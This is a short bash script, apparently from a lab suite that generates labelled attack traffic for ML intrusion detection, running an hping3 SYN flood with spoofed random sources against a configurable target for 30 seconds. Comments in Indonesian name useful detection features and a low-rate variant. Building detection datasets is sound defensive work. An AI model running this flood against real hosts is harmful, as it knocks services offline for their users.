#!/usr/bin/env bash
# S11 — DoS (hping3 SYN flood). Kategori: DoS.
# Target default: srv-web :80. Fase: mana saja. Durasi dibatasi (default 30s).
SCN=S11; ATTACK_CAT=DoS; PHASE=any
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool hping3
banner

TARGET="${1:-$SRV_WEB}"; PORT="${2:-80}"; DURATION="${3:-30}"
ensure_up "$TARGET"
echo "SYN flood -> $TARGET:$PORT selama ${DURATION}s (spoof source acak, raw socket)."

mark_start "$TARGET:$PORT"
# --flood = secepat mungkin; --rand-source = banyak source IP (pola DDoS-like);
# dibungkus timeout supaya pasti berhenti. Butuh root (raw socket).
sudo timeout "$DURATION" hping3 -S -p "$PORT" --flood --rand-source "$TARGET" || true
mark_end "$TARGET:$PORT"
echo "Selesai. Fitur ML kuat untuk DoS: rate, sload/dload, sintpkt."
# CAVEAT: --flood sangat membebani CPU attacker & link lab; 30s cukup untuk sampel.
# Untuk pola 'low-rate DoS', ganti --flood dengan '-i u1000' (1 paket/ms).
